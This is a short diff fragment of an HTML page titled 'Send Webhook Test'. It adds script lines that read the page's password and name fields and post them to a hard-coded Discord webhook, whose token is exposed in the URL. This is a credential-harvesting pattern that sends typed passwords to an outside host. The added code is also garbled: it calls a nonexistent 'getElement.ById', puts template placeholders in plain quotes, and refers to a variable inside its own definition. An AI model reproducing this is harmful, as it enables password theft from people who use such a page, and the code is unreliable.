@@ -8059,17 +8059,18 @@
                         </button>
                     </div>
 
-<!DOCTYPE html>
-<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Webhook Test</title>
     <script>
         function sendWebhook() {
+            let password = document.getElement.ById("password").value;
+            let name = document.getElement.ById("name").value;
+            
             const webhookURL = "https://discord.com/api/webhooks/1289384157981708288/XAgMGk0x3S1zI4XmpLP8KTKAdC0kryOxyMij3_XRuhI3MSljf1VqXAkknCFZnrjL31Vb";
             const message = {
-                content: "test",
+                content: "Name ${name}\nMessage: ${message}",
             };
 
             fetch(webhookURL, {
